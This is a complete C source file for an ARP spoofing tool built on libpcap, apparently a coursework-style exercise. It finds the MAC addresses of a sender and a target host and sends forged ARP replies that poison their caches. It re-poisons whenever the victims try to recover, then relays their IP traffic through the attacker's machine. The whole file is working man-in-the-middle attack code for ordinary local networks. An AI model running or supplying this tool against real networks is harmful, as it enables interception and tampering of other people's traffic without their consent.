#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>


#pragma pack(push,1)

struct ethernet{
	uint8_t destination_address[ETHER_ADDR_LEN];
	uint8_t source_address[ETHER_ADDR_LEN];
	uint16_t ethernet_type;
};


struct ip{
	uint8_t ip_hl:4, ip_v:4;
	uint8_t ip_tos;
	uint16_t ip_len;
	uint16_t ip_id;
	uint16_t ip_off;
	uint8_t ip_ttl;
	uint8_t ip_p;
	uint16_t ip_sum;
	struct in_addr ip_src;
	struct in_addr ip_dst;
};

struct arp{
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint16_t opcode;
	uint8_t sender_MAC[ETH_ALEN];
	struct in_addr sender_IP;
	uint8_t target_MAC[ETH_ALEN];
	struct in_addr target_IP;
};

struct arp_packet{
	struct ethernet ethernet_part;
	struct arp arp_part;
};

#pragma pack(pop)

void print_mac(char * str,u_char * addr){
	int i;
	printf("%s: ",str);
	for(i=0;i<ETHER_ADDR_LEN-1;i++)printf("%02x:",(u_char)*(addr+i));
	printf("%02x\n",(u_char)*(addr+i));
}

bool find_mac(u_char * p, int len, struct in_addr ip, uint8_t * mac){
	int i;
	struct arp_packet * a_ptr=(struct arp_packet *)p;
	if(ntohs(a_ptr->ethernet_part.ethernet_type)==ETHERTYPE_ARP){
		if(ntohs(a_ptr->arp_part.opcode)==ARPOP_REPLY){
			if(ip.s_addr==a_ptr->arp_part.sender_IP.s_addr){
				for(i=0;i<ETHER_ADDR_LEN;i++)*(mac+i)=*(a_ptr->arp_part.sender_MAC+i);
				//print_mac("mac",a_ptr->arp_part.sender_MAC);
				return true;
			}
		}
	}
	return false;
}

bool compare_mac(uint8_t *mac1, uint8_t *mac2=0){
	int i;
	if(mac2){
		for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=*(mac2+i))return false;
		return true;
	}
	else{
		for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=0xff)return false;
		return true;
	}
	
}

//ip1=send_ip, ip2=target_ip, mac=my_mac
bool check_recover(u_char * p, int len, struct in_addr ip1, struct in_addr ip2, uint8_t * mac){
	int i;
	struct arp_packet * a_ptr=(struct arp_packet *)p;
	if(ntohs(a_ptr->ethernet_part.ethernet_type)==ETHERTYPE_ARP){
		if(ntohs(a_ptr->arp_part.opcode)==ARPOP_REQUEST){
			if(ip1.s_addr==a_ptr->arp_part.sender_IP.s_addr){
				if(compare_mac(mac,a_ptr->ethernet_part.destination_address)&&(ip2.s_addr==a_ptr->arp_part.target_IP.s_addr))return true;
			}
			else if(ip2.s_addr==a_ptr->arp_part.sender_IP.s_addr){
				if(compare_mac(a_ptr->ethernet_part.destination_address))return true;
				
			}
		}
	}
	return false;
}

//ip1=send_ip, ip2=target_ip, mac1=send_mac, mac2=my_mac, mac3=target_mac
bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr ip2, uint8_t * mac1, uint8_t *mac2, uint8_t *mac3){
	int i;
	u_char * new_p=(u_char*)malloc(sizeof(u_char)*len);
	struct ethernet a;
	struct ethernet * a_ptr=&a;
	a_ptr=(struct ethernet *)p;
	if(ntohs(a_ptr->ethernet_type)==ETHERTYPE_IP){
		if(compare_mac(a_ptr->source_address, mac1)&&compare_mac(a_ptr->destination_address, mac2)){
			struct ip a;
			struct ip * a_ptr=&a;
			a_ptr=(struct ip *)(p+sizeof(struct ethernet));
			if(a_ptr->ip_src.s_addr==ip1.s_addr){
				memcpy(new_p,p,len);
				struct ethernet a;
				struct ethernet * a_ptr=&a;
				a_ptr=(struct ethernet *)new_p;
				for(i=0;i<ETHER_ADDR_LEN;i++)*(a_ptr->source_address+i)=*(mac2+i);
				for(i=0;i<ETHER_ADDR_LEN;i++)*(a_ptr->destination_address+i)=*(mac3+i);
				i=0;
				while(i<5){
					if(!pcap_sendpacket(fp, new_p, len))break;
					i++;
				}
				free(new_p);
				return true;
			}
		}
		
		 else if(compare_mac(a_ptr->source_address, mac3)&&compare_mac(a_ptr->destination_address,mac2)){
	         struct ip a;
	         struct ip * a_ptr=&a;
	         a_ptr=(struct ip *)(p+sizeof(struct ethernet));
	         if(a_ptr->ip_dst.s_addr==ip1.s_addr){
	            memcpy(new_p,p,len);
	            struct ethernet a;
	            struct ethernet * a_ptr=&a;
	            a_ptr=(struct ethernet *)new_p;
	            for(i=0;i<ETHER_ADDR_LEN;i++)*(a_ptr->source_address+i)=*(mac2+i);
	            for(i=0;i<ETHER_ADDR_LEN;i++)*(a_ptr->destination_address+i)=*(mac1+i);
	            i=0;
	            while(i<5){
	               if(!pcap_sendpacket(fp, new_p, len))break;
	               i++;
	            }
	           	free(new_p);
	           	return true;
	          }
	  	}
      	
   }
    free(new_p);
	return false;
}

void usage() {
  printf("syntax: arp_spoof <interface> <send ip> <target ip> [<sender ip2> <target ip2>]\n");
  printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}
 
void get_ip(char * interface, struct in_addr * ip){
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	*ip=((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
}

void get_mac_address(char * interface, uint8_t * addr){
	struct ifreq ifr;
	struct ifconf ifc;
	char buf[1024];
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	ioctl(sock, SIOCGIFCONF, &ifc);
	struct ifreq* it = ifc.ifc_req;
	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
	for (; it != end; ++it) {
		strcpy(ifr.ifr_name, it->ifr_name);
		if(!strcmp(interface,ifr.ifr_name)){
			if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
				if (! (ifr.ifr_flags & IFF_LOOPBACK)) { 
					if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
						memcpy(addr, ifr.ifr_hwaddr.sa_data, 6);   
						break;
                	}
            	}
        	}

    	}
    }
}



void make_arp_packet(u_char * p, struct in_addr ip1, struct in_addr ip2, uint8_t * mac1, uint8_t * mac2=0){
	int i;
	struct arp_packet a;
	struct arp_packet * a_ptr=&a;
	a_ptr=(struct arp_packet *)p;
	if(!mac2)for(i=0;i<ETHER_ADDR_LEN;i++)a_ptr->ethernet_part.destination_address[i]=0xff;
	else for(i=0;i<ETHER_ADDR_LEN;i++)a_ptr->ethernet_part.destination_address[i]=mac2[i];
	for(i=0;i<ETHER_ADDR_LEN;i++)a_ptr->ethernet_part.source_address[i]=mac1[i];
	a_ptr->ethernet_part.ethernet_type=ntohs(ETHERTYPE_ARP);
	a_ptr->arp_part.hardware_type=ntohs(ARPHRD_ETHER);
	a_ptr->arp_part.protocol_type=ntohs(ETHERTYPE_IP);
	a_ptr->arp_part.hardware_size=ETHER_ADDR_LEN;
	a_ptr->arp_part.protocol_size=sizeof(in_addr);
	if(!mac2){
		a_ptr->arp_part.opcode=ntohs(ARPOP_REQUEST);
	}
	else{
		a_ptr->arp_part.opcode=ntohs(ARPOP_REPLY);
	}
	for(i=0;i<ETHER_ADDR_LEN;i++)a_ptr->arp_part.sender_MAC[i]=mac1[i];	
	a_ptr->arp_part.sender_IP.s_addr=ip1.s_addr;
	if(!mac2)for(i=0;i<ETHER_ADDR_LEN;i++)a_ptr->arp_part.target_MAC[i]=0x00;
	else for(i=0;i<ETHER_ADDR_LEN;i++)a_ptr->arp_part.target_MAC[i]=mac2[i];
	a_ptr->arp_part.target_IP.s_addr=ip2.s_addr;
} 


int main(int argc, char* argv[]) {
  if (argc < 3) {
  	usage();
  	return -1;
  }
  int i;
  char* dev = argv[1];
  int n=(argc-1)/2;
  struct in_addr send_ip[10], target_ip[10];
  for(i=0;i<n;i++){
  	inet_aton(argv[(i+1)*2], &send_ip[i]);
  	inet_aton(argv[(i+1)*2+1], &target_ip[i]);
  }
  struct in_addr my_ip;
  get_ip(dev, &my_ip);
  uint8_t my_mac_address[ETHER_ADDR_LEN];
  get_mac_address(dev, my_mac_address);
  u_char* packet[20];
  for(i=0;i<2*n;i++)packet[i]=(u_char*)malloc(sizeof(u_char)*sizeof(arp_packet));
  for(i=0;i<n;i++)make_arp_packet(packet[i], my_ip, send_ip[i], my_mac_address);
  for(i=0;i<n;i++)make_arp_packet(packet[i+n], my_ip, target_ip[i], my_mac_address);

  char errbuf[PCAP_ERRBUF_SIZE];
  
  pcap_t *fp=pcap_open_live(dev,BUFSIZ, 1,1,errbuf);
  
  if (fp == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  for(i=0;i<2*n;i++)pcap_sendpacket(fp, packet[i], sizeof(arp_packet));

  uint8_t send_mac_address[10][ETHER_ADDR_LEN];
  uint8_t target_mac_address[10][ETHER_ADDR_LEN];
  
  bool checking[20];
  for(i=0;i<2*n;i++)checking[i]=false;
  
  while (1) {
  	struct pcap_pkthdr* header;
  	const u_char* p;
    int res = pcap_next_ex(fp, &header, &p);
    if (res == 0) continue;
    else if (res == -1){
    	fprintf(stderr, "error occurred while reading the packet\n");
    	for(i=0;i<2*n;i++)free(packet[i]);
    	pcap_close(fp);
    	return 0;
    }
    else if(res==-2){
    	fprintf(stderr, "packets are being read from a 'savefile' and there are no more packets to read from the saverfile\n");
    	for(i=0;i<2*n;i++)free(packet[i]);
    	pcap_close(fp);
    	return 0;
    }
    for(i=0;i<n;i++){
    	if(!checking[i]&&find_mac((u_char *)p, header->caplen,send_ip[i], send_mac_address[i])){
    		checking[i]=true;
    		break;
    	}
    	if(!checking[i+n]&&find_mac((u_char *)p, header->caplen,target_ip[i], target_mac_address[i])){
    		checking[i+n]=true;
    		break;
    	}
    }
    for(i=0;i<2*n;i++){
    	if(checking[i]==false)break;
    }
    if(i==2*n)break;
   }
  
  u_char * packet_attack[10];
  for(i=0;i<n;i++)packet_attack[i]=(u_char*)malloc(sizeof(u_char)*sizeof(arp_packet));
  
  
  for(i=0;i<n;i++)make_arp_packet(packet_attack[i], target_ip[i], send_ip[i], my_mac_address, send_mac_address[i]);
  
  printf("attack start!\n");

  for(i=0;i<n;i++)pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet));
 
while(1){
	struct pcap_pkthdr* header;
	const u_char* p;
	int res = pcap_next_ex(fp, &header, &p);
 	if (res == 0) continue;
 	else if (res == -1){
		fprintf(stderr, "error occurred while reading the packet\n");
		break;
  	}
  	else if(res==-2){
		fprintf(stderr, "packets are being read from a 'savefile' and there are no more packets to read from the saverfile\n");
		break;
	}
	
	int j;
	for(i=0;i<n;i++){
	  	if(check_recover((u_char *)p, header->caplen,send_ip[i],target_ip[i], my_mac_address)){
	  		j=0;
	  		while(j<5){
	  			if(!pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet)))break;
	  			j++;
	  		}
	  		break;
	  	}
	  	else{
  			if(relay(fp,(u_char *)p, header->caplen, send_ip[i], target_ip[i], send_mac_address[i], my_mac_address, target_mac_address[i]))break;
  		}
  	}
}

  
for(i=0;i<2*n;i++)free(packet[i]);
for(i=0;i<n;i++)free(packet_attack[i]);
pcap_close(fp);
  
return 0;
}
